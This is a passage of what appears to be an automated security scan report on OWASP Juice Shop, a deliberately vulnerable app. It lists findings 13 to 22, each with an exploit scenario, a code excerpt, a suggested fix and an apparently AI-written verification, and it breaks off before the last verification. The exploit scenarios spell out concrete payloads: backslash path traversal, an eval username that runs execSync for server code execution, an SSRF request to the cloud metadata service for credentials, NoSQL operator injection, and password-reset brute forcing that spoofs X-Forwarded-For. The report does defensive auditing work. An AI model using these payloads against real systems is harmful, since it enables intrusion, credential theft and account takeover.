Use parameterized queries: pass `criteria` via Sequelize replacements/bind parameters (e.g. `query('... LIKE :q ...', { replacements: { q: '%'+criteria+'%' } })`) instead of string interpolation at routes/search.ts:19. Truncation at line 18 is not a security control.

**Exploitability:** Unauthenticated SQLi in product search, UNION-extractable to Users table. CVSS 7.5 High; only truncation, no parameterization.

#### Adversarial verification
**Verdict:** TRUE_POSITIVE (confidence: 10/10) — unauthenticated raw-concatenated SQL in reachable search route; PoC UNION payloads confirmed in tests, no upstream control

Confirmed. The reported snippet matches the live code at lines 17–19 exactly. The route `GET /rest/products/search` is registered at server.ts:555 with **no** `security.isAuthorized()` or any auth middleware (contrast lines 589–590 which do gate review endpoints). User input `req.query.q` is only truncated to 200 chars — no escaping, no parameter binding, no allow-list — then string-interpolated directly into a raw `models.sequelize.query` LIKE clause. The code itself even checks for the `unionSqlInjectionChallenge` and `dbSchemaChallenge` solutions, confirming this is the deliberately planted, unauthenticated UNION SQLi. The test suite (searchApiSpec.ts:43–119) demonstrates working `') union select ...` and `sqlite_master` exfiltration payloads.

No defence found: unauthenticated reachable, no parameterization, attacker fully controls the query. Impact is confirmed credential/schema disclosure. The 200-char cap does not prevent a working UNION payload. The query is a SELECT and SQLite via sequelize does not execute stacked statements, so integrity/availability impact is limited; confidentiality is full.

### 14. [HIGH] Path traversal in log file server via backslash bypass
**Class:** CWE-22: Improper Limitation of a Pathname to a Restricted Directory (Path Traversal)
**CWE:** CWE-22: Improper Limitation of a Pathname to a Restricted Directory (Path Traversal) - https://cwe.mitre.org/data/definitions/22.html
**File:** `routes/logfileServer.ts:8-15`
**CVSS 3.1:** **7.5** (High) — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N`
**OffensivePriority:** **P3** - Internal Network / Privileged Position | *exposure unverified — no CMDB context; AV:N (network-routable; internet exposure unconfirmed)*
**Confidence:** 0.80 (1 run agreed)

#### Description
The handler takes the route parameter `params.file` (attacker-controlled, no auth) and only rejects values containing a forward slash ('/'). It then calls `res.sendFile(path.resolve('logs/', file))`. `path.resolve` treats backslashes as path separators on Windows and will normalize `..` segments, so an input like `..\..\package.json` passes the `!file.includes('/')` check yet resolves to a path above the logs directory. The check is a denylist of a single character rather than an allowlist of safe filenames or a containment check that the resolved path stays inside the logs directory.

#### Impact
An unauthenticated attacker can read arbitrary files outside the logs directory on Windows hosts (and any platform treating backslash as a separator), exposing source code, configuration, and secrets. Because the only filter blocks forward slashes, alternate separators are not caught.

#### Exploit scenario
On a Windows deployment the attacker requests `GET /support/logs/..\..\..\Windows\win.ini` (or `..\..\package.json`). The filter passes because no '/' is present, and `path.resolve('logs/', '..\..\package.json')` escapes the logs folder. `res.sendFile` returns the contents of the targeted file to the unauthenticated attacker.

#### Preconditions
- Route serveLogFiles() is mounted (e.g. /support/logs/:file) and reachable without authentication
- Backslash treated as path separator (Windows host) for full traversal; on POSIX the single-char denylist is still insufficient defense-in-depth

```
const file = params.file

if (!file.includes('/')) {
  res.sendFile(path.resolve('logs/', file))
} else {
  res.status(403)
  next(new Error('File names cannot contain forward slashes!'))
}
```

#### How to fix
Do not rely on a single-character denylist. Resolve the candidate path and verify it stays within the logs directory: compute `const base = path.resolve('logs'); const target = path.resolve(base, file);` then reject unless `target.startsWith(base + path.sep)`. Alternatively validate `file` against an allowlist regex such as `^[A-Za-z0-9._-]+$` and reject any input containing '/', '\\', or '..' before calling sendFile.

**Exploitability:** Log-file traversal via backslash; only exploitable on Windows separators, inert on the Linux distroless deployment despite AC:L/CVSS 7.5.

#### Adversarial verification
**Verdict:** TRUE_POSITIVE (confidence: 8/10) — unauthenticated route, slash-only denylist bypassed by backslash on Windows, resolves outside logs/ and discloses arbitrary files via sendFile

The route is mounted unauthenticated at `/support/logs/:file` (server.ts:261), and the handler only rejects forward slashes while passing `params.file` to `path.resolve('logs/', file)` + `res.sendFile`. This is a deliberately-planted path traversal in Juice Shop. On Windows, `..\..\package.json` bypasses the single-character denylist and escapes the logs directory; the resolved path is served to an unauthenticated attacker. The denylist is exactly as described — no allowlist, no containment check on the resolved path.

External entry point confirmed (network, unauthenticated). No upstream defense closes the path (`serveIndexMiddleware` and `accessControlChallenges` verify gate the listing, not the file param). Impact is real arbitrary file read.

Note: full traversal requires backslash-as-separator (Windows). On POSIX the single-char denylist is weak defense-in-depth but `\` isn't a separator, limiting traversal — yet the platform-dependent path-escape is still a genuine, reachable disclosure.

### 15. [HIGH] Server-side eval of attacker-controlled username (SSTI/RCE)
**Class:** CWE-94: Improper Control of Generation of Code (Code Injection)
**CWE:** CWE-94: Improper Control of Generation of Code (Code Injection) - https://cwe.mitre.org/data/definitions/94.html
**File:** `routes/userProfile.ts:52-62`
**CVSS 3.1:** **8.8** (High) — `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H`
**OffensivePriority:** **P3** - Internal Network / Privileged Position | *exposure unverified — no CMDB context; AV:N (network-routable; internet exposure unconfirmed)*
**Confidence:** 0.95 (1 run agreed)

#### Description
username is read from the persisted UserModel (user.username, line 50), which is fully attacker-controlled because users register/update their own account. Line 52 tests username against /#{(.*)}/; on match, line 54 extracts the inner expression (username.substring(2, length-1)) and line 59 passes it directly to eval(code). No sanitization, allow-list, or sandbox exists between the stored username and the eval sink. The catch block only falls back when eval throws, so any valid JS expression executes server-side. This is a server-side template-injection-style code execution, not merely the documented client XSS.

#### Impact
Any authenticated user who sets their profile username to a string of the form #{...} causes the server to eval() the enclosed JavaScript when their profile page is rendered. This grants arbitrary server-side code execution in the Node.js process, exposing all data and the underlying host.

#### Exploit scenario
An attacker registers (or updates their profile to) a username such as #{global.process.mainModule.require('child_process').execSync('id')}. They then request GET /profile with their session cookie; getUserProfile loads their username, matches the #{...} pattern, and runs eval on the embedded code, executing the shell command on the server. The attacker repeats with arbitrary payloads to achieve full RCE.

#### Preconditions
- Attacker has any authenticated session (registers a normal account)
- usernameXssChallenge is enabled (default in this distribution)

```
if (username?.match(/#{(.*)}/) !== null && utils.isChallengeEnabled(challenges.usernameXssChallenge)) {
  req.app.locals.abused_ssti_bug = true
  const code = username?.substring(2, username.length - 1)
  try {
    if (!code) { throw new Error('Username is null') }
    username = eval(code)
  } catch (err) {
    username = '\\' + username
  }
}
```

#### How to fix
Never eval() persisted user data. Remove the eval(code) branch at routes/userProfile.ts:59 entirely; render the username only through context-aware HTML escaping (entities.encode) before substituting into the template, treating it as inert data.

**Exploitability:** Stored username eval = server-side RCE, but attacker controls only their own account and triggers on own profile view. CVSS 8.8 High.

#### Adversarial verification
**Verdict:** TRUE_POSITIVE (confidence: 9/10) — attacker-controlled stored username reaches real `eval` via authenticated GET /profile; sanitizers strip only HTML, not `#{...}` expressions, so RCE path is open

**Analysis**

**A. The sink (userProfile.ts:50–62):** Confirmed verbatim. `username` is read from the persisted `UserModel`, the `#{(.*)}` regex matches, the inner expression is extracted via `substring(2, length-1)`, and passed directly to `eval(code)`. The catch only handles eval throwing.

**B. Call chain to external entry:**
- Sink reached via `GET /profile` → `getUserProfile()` (server.ts:611), guarded only by `updateAuthenticatedUsers()` — any authenticated user.
- `username` is attacker-controlled: `POST /profile` → `updateUserProfile()` (server.ts:612) does `user.update({ username: req.body.username })` (updateUserProfile.ts:33). Open registration + self-service profile update → any low-priv user controls the stored value. **External entry point reached.**

**C. Searching for a defence:**
- The `username` setter (user.ts:44–51) runs `sanitizeLegacy` or `sanitizeSecure`.
  - `sanitizeLegacy = input.replace(/<(?:\w+)\W+?[\w]/gi, '')` — strips only HTML-tag-like sequences. `#{...}` contains no `<tag>`, so it passes untouched.
  - `sanitizeSecure` wraps `sanitize-html`, which strips HTML markup. `#{global.process.mainModule.require('child_process').execSync('id')}` is not HTML and survives intact.
- No allow-list, type/length constraint, or sandbox sits between the stored value and `eval`. `eval` is the real Node `eval` (no vm/notevil wrapper here, unlike b2bOrder).
- Gate: `isChallengeEnabled(challenges.usernameXssChallenge)` — enabled by default in this distribution.

**D. Probing the defence:** The sanitizers target XSS markup, not template/JS expression syntax. The `#{}` payload bypasses both code paths entirely. The catch block (line 60) only re-wraps on eval failure; a syntactically valid expression executes.

**Verdict reasoning:** External, low-privilege entry point reached; input flows unsanitized into a real `eval`; no control closes the path. This is the intentional Juice Shop SSTI/RCE challenge, but it is a genuine, exploitable server-side code-execution. The scanner correctly identified sink, file, and class. Impact: arbitrary JS → OS command execution in the Node process (C/I/A all High). PR:L because an account is required; UI:N since the attacker triggers their own profile fetch. Scope U — execution stays within the app's runtime authority.

### 16. [HIGH] Passwords hashed with unsalted MD5
**Class:** CWE-916
**CWE:** CWE-916 - https://cwe.mitre.org/data/definitions/916.html
**File:** `lib/insecurity.ts:37-37`
**CVSS 3.1:** **7.5** (High) — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N`
**OffensivePriority:** **P3** - Internal Network / Privileged Position | *exposure unverified — no CMDB context; AV:N (network-routable; internet exposure unconfirmed)*
**Confidence:** 0.85 (1 run agreed)
**Also at:** `models/user.ts:70-75`

*1 additional call site(s) collapsed during dedup — same root cause; each location needs the same fix applied.*

#### Description
hash() applies a single unsalted MD5 round to the password. login.ts feeds req.body.password through this function before comparison, and the same digest is what is stored. MD5 is fast and collision/preimage-friendly, and the absence of a per-user salt makes precomputed-table attacks effective.

#### Impact
User passwords are stored as unsalted MD5 digests. If the database is exposed (e.g. via the SQLi above), the hashes are trivially cracked with rainbow tables, exposing plaintext credentials and enabling credential-stuffing against other services.

#### Exploit scenario
After extracting the Users table via the search or login SQLi, the attacker runs the MD5 hashes through hashcat against a wordlist/rainbow table and recovers most plaintext passwords within seconds.

#### Preconditions
- read access to stored hashes (e.g. via SQLi)

```
export const hash = (data: string) => crypto.createHash('md5').update(data).digest('hex')
```

#### How to fix
Replace MD5 with a salted memory-hard KDF (bcrypt/scrypt/argon2) at insecurity.ts:37 and migrate stored hashes.

**Exploitability:** Unsalted fast MD5 — only matters after a DB compromise (requires second vuln, e.g. [6]); amplifies SQLi to cracked plaintext creds. Downranked from CVSS 7.5 for dependency.

#### Adversarial verification
**Verdict:** TRUE_POSITIVE (confidence: 9/10) — unsalted single-round MD5 is the live password-storage scheme (user.ts setter + login.ts), reachable unauth, no salt/KDF/defence; dumped hashes crack trivially.

Confirmed against source. `lib/insecurity.ts:37` is exactly as reported — a single unsalted MD5 round. `models/user.ts:73` uses `security.hash(clearTextPassword)` in the password setter (so the stored value is the MD5 digest), and `routes/login.ts:31` hashes `req.body.password` with the same function for comparison inside a raw string-concatenated SQL query (the well-known SQLi sink). So the dump-then-crack path is real: unauth SQLi → extract Users → crack unsalted MD5.

This is production code (not test/fixture), reached via an unauthenticated network route, with no salt, no work factor, and no upstream defence. The scanner read the code correctly (correct file, line, sink, and class). It is an intentional Juice Shop vuln, but it still meets the TRUE_POSITIVE criteria: external reachability + real credential-disclosure impact + no mitigating control.

The precondition (read access to hashes) is itself satisfiable via the SQLi in the same file, so the weakness has a demonstrated path to plaintext-credential recovery rather than being a theoretical best-practice gap.

### 17. [HIGH] Server-side request forgery via user-supplied profile image URL
**Class:** CWE-918: Server-Side Request Forgery (SSRF)
**CWE:** CWE-918: Server-Side Request Forgery (SSRF) - https://cwe.mitre.org/data/definitions/918.html
**File:** `routes/profileImageUrlUpload.ts:16-21`
**CVSS 3.1:** **7.7** (High) — `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N`
**OffensivePriority:** **P3** - Internal Network / Privileged Position | *exposure unverified — no CMDB context; AV:N (network-routable; internet exposure unconfirmed)*
**Confidence:** 0.90 (1 run agreed)

#### Description
req.body.imageUrl is taken verbatim into `url` (line 16) and passed directly to `fetch(url)` (line 21) with no host allow-list, scheme restriction, or private-IP filtering. The attacker fully controls both the scheme and host of the request, so the server will connect to any reachable internal or external endpoint. The retrieved body is streamed to a file under the uploads directory keyed by the user id (line 26-27), and on error the raw URL is even stored as the profile image (line 33).

#### Impact
Any authenticated user can make the server issue arbitrary HTTP(S) requests to attacker-chosen hosts, including internal/metadata endpoints (e.g. cloud metadata 169.254.169.254, localhost admin services). The fetched body is written to disk and the response status is observable, enabling internal network probing and data exfiltration.

#### Exploit scenario
An authenticated user sends POST to the profile image upload endpoint with body `{"imageUrl":"http://169.254.169.254/latest/meta-data/iam/security-credentials/"}`. The server fetches the internal metadata URL and writes the response into the user's profile image file, which the attacker then downloads from `/assets/public/images/uploads/<id>.jpg`, leaking internal data. Varying the host lets the attacker map internal services via response/error timing.

#### Preconditions
- Attacker has a valid authenticated session (login token cookie)

```
const url = req.body.imageUrl
...
const response = await fetch(url)
```

#### How to fix
Before calling fetch, validate `url` against an allow-list of permitted schemes (https only) and resolve+reject private/loopback/link-local IP ranges; reject redirects to internal hosts. Apply this guard at lines 16-21 in profileImageUrlUpload.ts.

**Exploitability:** Post-auth SSRF with no scheme/host/IP filtering → cloud metadata and internal services, response written to disk. CVSS 8.5 High.

#### Adversarial verification
**Verdict:** TRUE_POSITIVE (confidence: 9/10) — user-controlled imageUrl flows verbatim into fetch() with no scheme/host/IP restriction, reachable by any authenticated user; response is written to a downloadable file enabling internal data exfiltration.

I have confirmed the finding against the actual source. The verification:

**A. Sink confirmed** — Line 16 `const url = req.body.imageUrl`, line 21 `await fetch(url)`. No scheme restriction, no host allow-list, no private-IP filtering. Line 17 only matches a challenge-tracking regex (sets a flag), it does not block anything. The fetched body is streamed to `frontend/dist/.../uploads/<userId>.<ext>` (line 26-27) and downloadable; on error the raw URL is stored as profile image (line 33).

**B. External entry point reached** — Registered at `server.ts:285` `app.post('/profile/image/url', ...)`. Network-reachable HTTP POST. The route enforces its own auth (line 18-19: `security.authenticatedUsers.get(req.cookies.token)` → must be logged in), so it's reachable by any authenticated user.

**C. Search for defenses** — The global `isAuthorized()`/`denyAll()` guards (line 322+) are registered *after* this route and don't apply. The only upstream middleware is `uploadToMemory.single('file')` (multer), which does not touch `req.body.imageUrl`. No URL parsing, no SSRF protection, no allow-list anywhere in the flow.

**D. Probe** — Nothing to bypass; there is no control. Attacker fully controls scheme and host (e.g. `http://169.254.169.254/...`). Response body is written to the attacker's own profile-image file then downloadable from `/assets/public/images/uploads/<id>.<ext>`, enabling exfiltration of internal responses; error path leaks via the stored URL / timing.

This is a genuine, exploitable SSRF (an intentional Juice Shop challenge, but a real server-side sink reachable from a network entry point with no neutralizing control). PR is Low (any authenticated user). Scope Changed — the server reaches internal services/metadata beyond the app component; Confidentiality High (internal data/credentials leak). Integrity limited to attacker's own profile image (not scored H); Availability N.

### 18. [HIGH] PUT /api/Products/:id update endpoint has no authorization
**Class:** CWE-862: Missing Authorization
**CWE:** CWE-862: Missing Authorization - https://cwe.mitre.org/data/definitions/862.html
**File:** `server.ts:335-337`
**CVSS 3.1:** **7.5** (High) — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N`
**OffensivePriority:** **P3** - Internal Network / Privileged Position | *exposure unverified — no CMDB context; AV:N (network-routable; internet exposure unconfirmed)*
**Confidence:** 0.80 (1 run agreed)

#### Description
The Product model is exposed via finale.resource with endpoints /api/Products and /api/Products/:id (server.ts:447, 463-468), which provides list/read/create/UPDATE/delete. The wiring only guards POST (server.ts:335 isAuthorized) and DELETE (server.ts:337 denyAll). There is no app.put('/api/Products/:id', ...) guard, so finale's update handler is reachable by anyone. An attacker can change price/deluxePrice to arbitrary values or overwrite name/description.

#### Impact
Any unauthenticated user can modify any product record (name, description, price, deluxePrice, image) because the finale auto-CRUD update route is exposed without a guard. This allows catalog tampering and price manipulation, and the description setter can be abused to persist scripted content.

#### Exploit scenario
Attacker sends PUT /api/Products/1 with {"price":0.01} and no auth header; the product price is changed to 0.01 for all shoppers. Repeating across IDs lets the attacker rewrite the entire catalog.

#### Preconditions
- None — endpoint reachable anonymously

```
app.post('/api/Products', security.isAuthorized())
app.delete('/api/Products/:id', security.denyAll())
// no PUT guard -> finale update is open
```

#### How to fix
Add an explicit guard for the update verb, e.g. app.put('/api/Products/:id', security.denyAll()) or security.isAuthorized() with role check, alongside the existing POST/DELETE guards near server.ts:335-337.

**Exploitability:** Unauthenticated PUT /api/Products/:id — anyone can rewrite price/name/description. Integrity impact, no auth. CVSS 7.5 High.

#### Adversarial verification
**Verdict:** TRUE_POSITIVE (confidence: 9/10) — PUT /api/Products/:id is auto-exposed by finale with no isAuthorized/denyAll guard (only POST and DELETE are gated), letting any anonymous request rewrite price/name/description across the catalog.

I have enough evidence. Let me confirm the verdict.

**A. What the code does (server.ts:335-337):** Confirmed verbatim. Only `app.post('/api/Products', isAuthorized())` and `app.delete('/api/Products/:id', denyAll())` exist. No `app.put('/api/Products/:id', …)` and no `app.use('/api/Products/:id', …)` guard anywhere (grep across the whole file confirms only lines 335 and 337 reference Products endpoints).

**Finale exposure (447, 463-468):** ProductModel is registered in `autoModels` with `exclude: []` and endpoints `/api/Products` + `/api/Products/:id`. finale-rest auto-wires full CRUD — list/read/create/**update (PUT/PATCH)**/delete. The Product hooks at 525-538 only translate name/description on read/list; nothing guards update.

**B. Entry point:** `finale.resource` is the documented unauth-reachable network surface. PUT reaches the update handler with no middleware in front of it.

**C. Hunt for a defence — and the contrast is decisive:** The surrounding code explicitly guards the update verb for *every other* sensitive model — `app.put('/api/Recycles/:id', denyAll())` (355), `/api/Feedbacks/:id` (399), `/api/Cards/:id` (406), `/api/Users/:id .put(denyAll())` (332), `/api/BasketItems/:id` with `appendUserId` (392), `/api/Addresss/:id` (416). Products has POST and DELETE locked but the PUT guard is conspicuously absent. There is no global `/api/*` authorization middleware, no allow-list, no JWT gate covering this path. `excludeAttributes` is empty, so price/deluxePrice/name/description are all writable.

**D. No edge case needed** — the path is simply unguarded. This is in fact the intentional Juice Shop "Product Tampering" challenge, but per SAST rules that doesn't change the verdict: it is a genuinely reachable, unauthenticated integrity flaw.

Scanner read the code correctly: right file, right lines, right class (broken authorization / logic-flaw). Impact is integrity of the shared product catalog for all users — real, not hypothetical. No confidentiality leak (read was already public) and no availability impact, so I/H, C/N, A/N.

### 19. [HIGH] getMemories returns all users' memories with joined user data
**Class:** CWE-200: Exposure of Sensitive Information to an Unauthorized Actor
**CWE:** CWE-200: Exposure of Sensitive Information to an Unauthorized Actor - https://cwe.mitre.org/data/definitions/200.html
**File:** `routes/memory.ts:19-23`
**CVSS 3.1:** **7.5** (High) — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N`
**OffensivePriority:** **P3** - Internal Network / Privileged Position | *exposure unverified — no CMDB context; AV:N (network-routable; internet exposure unconfirmed)*
**Confidence:** 0.60 (1 run agreed)

#### Description
MemoryModel.findAll({ include: [UserModel] }) performs an unscoped query — there is no WHERE clause limiting results to the requesting user, and no authorization filter. The joined UserModel exposes user attributes alongside each memory. The response serializes the entire dataset back to the client.

#### Impact
getMemories() returns every memory record from every user, eagerly joining the full UserModel. Any caller able to hit this endpoint can enumerate all users' captions, uploaded image paths, and associated user records, exposing PII across tenants/accounts.

#### Exploit scenario
An attacker requests the memories listing endpoint and receives a JSON array containing every memory plus its owner's user record, harvesting other users' image paths and identifying data.

#### Preconditions
- Endpoint reachable by the attacker

```
const memories = await MemoryModel.findAll({ include: [UserModel] })
res.status(200).json({ status: 'success', data: memories })
```

#### How to fix
Scope the query to the authenticated user (add where: { UserId: req.user.id }) or restrict the included UserModel attributes to non-sensitive fields, and enforce authorization on the route.

**Exploitability:** Unscoped getMemories returns all users' memories with joined user data; bulk PII, unauth. CVSS 7.5 High.

#### Adversarial verification
**Verdict:** TRUE_POSITIVE (confidence: 9/10) — unauthenticated GET /rest/memories returns all users' memories joined with full UserModel records (password hashes, totpSecret, email); no auth guard or column projection anywhere in the path

I've confirmed the finding against the actual source.

**A. Sink:** `routes/memory.ts:21` — `MemoryModel.findAll({ include: [UserModel] })` with no `WHERE` clause and no user filter. Serialized directly to JSON.

**B. Call chain:** `getMemories()` → registered at `server.ts:583`: `app.get('/rest/memories', getMemories())`. No middleware. Compare to neighboring routes (`/rest/wallet/balance` uses `security.appendUserId()`, `/rest/order-history/orders` uses `security.isAccounting()`). This route has **no auth/authz guard** — reachable unauthenticated over the network.

**C. Defences sought:** None. No allow-list, no per-user scoping, no `attributes` projection to exclude sensitive columns, no auth gate. The joined `UserModel` exposes `password` (hash), `totpSecret`, `email`, `role`, `lastLoginIp` — none stripped.

**D.** The single route is the only path; it is fully unprotected.

This is a genuine broken-access-control / sensitive-data-exposure: an unauthenticated request to `/rest/memories` returns every memory joined with each owner's full user record, including password hashes and TOTP secrets. Confidentiality impact is high; no integrity/availability impact. (Intentional Juice Shop challenge, but the finding is technically correct and reachable.)

### 20. [HIGH] Unauthenticated password reset with no security-answer brute-force protection
**Class:** CWE-307
**CWE:** CWE-307 - https://cwe.mitre.org/data/definitions/307.html
**File:** `routes/resetPassword.ts:31-47`
**CVSS 3.1:** **7.4** (High) — `CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N`
**OffensivePriority:** **P3** - Internal Network / Privileged Position | *exposure unverified — no CMDB context; AV:N (network-routable; internet exposure unconfirmed)*
**Confidence:** 0.60 (1 run agreed)

#### Description
The handler is reachable unauthenticated. It takes attacker-controlled body.email/body.answer/body.new/body.repeat, looks up the SecurityAnswerModel for that email, and on a single equality match (security.hmac(answer) === data.answer) calls user.update({ password: ... }) to set a fully attacker-chosen password. There is no attempt counter, delay, captcha, or lockout between guesses, and the only secret protecting the account is a low-entropy human-chosen security answer (e.g. a pet name or city). An attacker can therefore script unlimited guesses against any known email until the answer matches, then reset the password.

#### Impact
Any anonymous attacker who knows a victim's email can repeatedly submit guesses for the account's security answer with no rate limiting or lockout, and on a correct guess fully overwrites the victim's password — granting complete account takeover.

#### Exploit scenario
Attacker enumerates a target email (e.g. via the user feedback/order endpoints), then POSTs to /rest/user/reset-password with {email, answer: <guess>, new:'pwned', repeat:'pwned'} in a loop iterating common security-answer values. Each wrong guess simply returns 401 'Wrong answer to security question.' with no penalty. On the correct guess the server overwrites the victim's password with 'pwned' and returns the user object, completing account takeover.

#### Preconditions
- Attacker knows or can enumerate the victim's email address
- Victim's security answer is guessable / brute-forceable (typical of security questions)

```
const data = await SecurityAnswerModel.findOne({ include: [{ model: UserModel, where: { email } }] })
if ((data != null) && security.hmac(answer) === data.answer) {
  const user = await UserModel.findByPk(data.UserId)
  if (user) {
    const updatedUser = await user.update({ password: ... })
```

#### How to fix
Enforce rate limiting and a failed-attempt lockout on the reset-password endpoint keyed by account+IP, and require an out-of-band token (emailed one-time link) rather than allowing password change on raw security-answer equality. In this handler (lines 38-44) gate the user.update on a verified single-use reset token instead of, or in addition to, the security answer.

**Exploitability:** Unauthenticated password reset gated only on low-entropy security answer with no lockout → account takeover. CVSS 8.1 High; amplified by [50] and [44].

#### Adversarial verification
**Verdict:** TRUE_POSITIVE (confidence: 8/10) — unauth reset-password sink gated only by a low-entropy security answer; the lone rate-limit defence is keyed on the spoofable X-Forwarded-For header and is trivially bypassed, leaving a real brute-force account-takeover path.

I've verified the finding. Let me note my analysis:

**A. The sink (resetPassword.ts:31-47):** Confirmed exactly as described. Unauthenticated handler reads `body.email/answer/new/repeat`, looks up `SecurityAnswerModel` by email, and on a single `security.hmac(answer) === data.answer` equality match calls `user.update({ password: [REDACTED-SECRET] })` with an attacker-chosen password. No attempt counter, captcha, or lockout in the handler itself.

**B. Entry point:** `server.ts:551` — `app.post('/rest/user/reset-password', resetPassword())`. No `security.isAuthorized()` middleware in front of this route. Externally reachable, unauthenticated. ✔ external entry point reached.

**C. Hunting for a defence:** The scanner claimed "no brute-force protection," but `server.ts:314-318` DOES apply an express `rateLimit` to `/rest/user/reset-password`: 100 requests / 5 min.

**D. Probing the defence:** The rate-limit `keyGenerator` returns `headers['X-Forwarded-For'] ?? ip`. The bucket key is taken from the fully attacker-controlled `X-Forwarded-For` request header. An attacker simply rotates that header value per request, landing each guess in its own bucket → the rate limit is trivially bypassed. With `trust proxy` enabled it's even more directly attacker-influenced. The defence does not close the path.

So: unauthenticated external entry point ✔, the only control (rate limit) is bypassable via header spoofing ✔, the sole secret is a low-entropy human-chosen security answer ✔, and a correct guess yields full account takeover (attacker-set password, victim user object returned). This is an intentional Juice Shop challenge family (resetPassword*/geoStalking), but it is a genuine, externally exploitable account-takeover path — in scope and real.

Impact: account takeover → read victim data (C:H) and control account/password (I:H). Exploitation depends on the security answer being guessable/OSINT-discoverable (condition outside attacker's full control), so AC:H.

### 21. [HIGH] NoSQL injection in product review update selector
**Class:** CWE-943
**CWE:** CWE-943 - https://cwe.mitre.org/data/definitions/943.html
**File:** `routes/updateProductReviews.ts:13-17`
**CVSS 3.1:** **7.1** (High) — `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:H/A:N`
**OffensivePriority:** **P3** - Internal Network / Privileged Position | *exposure unverified — no CMDB context; AV:N (network-routable; internet exposure unconfirmed)*
**Confidence:** 0.95 (1 run agreed)

#### Description
The handler passes req.body.id straight into the MongoDB (NeDB) update selector `{ _id: req.body.id }` with `{ multi: true }`. Because the body is parsed as JSON, `id` need not be a string; an attacker can send an object such as `{"$ne": ""}` or `{"$gt": ""}`. The selector then matches every document and, combined with `multi: true`, rewrites the `message` field of all reviews to the attacker-supplied value. No validation coerces `id` to a primitive, and no ownership/authorization check restricts which review a caller may edit — the code only inspects `user` afterwards to decide which challenge to mark solved.

#### Impact
Any authenticated user can overwrite the text of arbitrary or ALL product reviews by injecting a NoSQL operator object as the review id. This corrupts the integrity of every product review in the catalog and lets one user forge other users' reviews.

#### Exploit scenario
An authenticated user issues `PATCH /rest/products/reviews` with body `{"id": {"$ne": -1}, "message": "pwned"}`. The selector matches every review document, and with multi:true every review's message is replaced with "pwned", returning a result.modified > 1. The same primitive also forges a single targeted review authored by another user.

#### Preconditions
- Attacker has any authenticated session (valid JWT)
- Request body is JSON so id can be an object rather than a string

```
db.reviewsCollection.update(
  { _id: req.body.id },
  { $set: { message: req.body.message } },
  { multi: true }
)
```

#### How to fix
Coerce and validate req.body.id to a string before building the selector (e.g. `{ _id: String(req.body.id) }`) and enforce that the review's author matches the authenticated user before allowing the update. Reject non-string id values at the boundary with a schema validator.

**Exploitability:** NoSQL operator injection + multi:true rewrites message of ALL reviews; broad integrity impact. ~CVSS 7.1 High.

#### Adversarial verification
**Verdict:** TRUE_POSITIVE (confidence: 9/10) — authenticated network route feeds unvalidated JSON `id` into a MarsDB selector with multi:true; operator-object input (`{"$ne":""}`) mass-rewrites all reviews and forges others' reviews; no validation or authz closes the path.

Confirmed against source. The finding is accurate.

**A. Code at sink:** `routes/updateProductReviews.ts:13-17` passes `req.body.id` directly into `db.reviewsCollection.update({ _id: req.body.id }, { $set: { message: req.body.message } }, { multi: true })`. No coercion to primitive.

**B. Call chain:** `server.ts:589` — `app.patch('/rest/products/reviews', security.isAuthorized(), updateProductReviews())`. External network entry point, gated only by `isAuthorized()` (`expressJwt` — any valid JWT, i.e. any authenticated user). No `:id` path param; the selector value comes solely from the JSON body.

**C. Defences sought — none found:**
- No input validation/coercion on `req.body.id` anywhere before the sink.
- `reviewsCollection` is a `MarsDB.Collection` (`data/mongodb.ts`) — a Mongo-like store that honors query operators (`$ne`, `$gt`), so an object selector is interpreted, not stringified.
- `isAuthorized()` only checks authentication, not ownership — the `user` is inspected *after* the update, purely to flag challenges. No authz gate restricts which review is edited.
- `multi: true` ⇒ a matching object selector rewrites every review's `message`.

**D.** The only "control" (the post-hoc `user` check) does nothing to constrain the selector.

**Impact:** Integrity — full tampering of all review messages and forging reviews attributed to other users (the `forgedReviewChallenge`/`noSqlReviewsChallenge`). Some confidentiality leak via `result.original` (returns matched documents incl. other authors). Availability unaffected. This is an intentionally planted Juice Shop challenge, but per the rules a deliberate-yet-real, externally reachable injection with genuine impact is a TRUE_POSITIVE — the scanner read the sink, class, and file correctly.

### 22. [HIGH] Missing ownership check lets any user edit others' reviews
**Class:** CWE-639: Authorization Bypass Through User-Controlled Key
**CWE:** CWE-639: Authorization Bypass Through User-Controlled Key - https://cwe.mitre.org/data/definitions/639.html
**File:** `routes/updateProductReviews.ts:13-16`
**CVSS 3.1:** **7.1** (High) — `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:H/A:N`
**OffensivePriority:** **P3** - Internal Network / Privileged Position | *exposure unverified — no CMDB context; AV:N (network-routable; internet exposure unconfirmed)*
**Confidence:** 0.90 (1 run agreed)

#### Description
The handler reads user = security.authenticatedUsers.from(req) at line 12 but never uses it to authorize the update. The MongoDB update at lines 13-16 filters solely on { _id: req.body.id } — an identifier taken directly from the request body — and sets message to req.body.message. Nowhere is the review's author compared against the caller's identity before mutation. The forgedReviewChallenge check (line 20) explicitly recognizes that result.original[0].author !== user.data.email is achievable, confirming a caller can modify a review they do not own.

#### Impact
Any caller can overwrite the message of any product review regardless of who authored it. There is no verification that the review identified by req.body.id belongs to the authenticated user, enabling horizontal privilege escalation / IDOR against every other user's review content.

#### Exploit scenario
An authenticated attacker sends PATCH /rest/products/reviews with body {"id":"<victim_review_id>","message":"spam/defamation"}. The server overwrites the victim's review message with no ownership check and returns success. The attacker can sweep review IDs to tamper with arbitrary users' feedback.

#### Preconditions
- Attacker knows or can enumerate a review _id
- Route is reachable (registered in server.ts)

```
db.reviewsCollection.update(
  { _id: req.body.id },
  { $set: { message: req.body.message } },
  { multi: true }
)
```

#### How to fix
Before calling reviewsCollection.update, load the target review and verify its author equals user.data.email (reject otherwise), and scope the update filter to that author. Do not trust req.body.id as the sole authorization boundary.

**Exploitability:** Missing ownership check lets any user edit others' reviews by id; integrity over all reviews. ~CVSS 7.1 High.

#### Adversarial verification
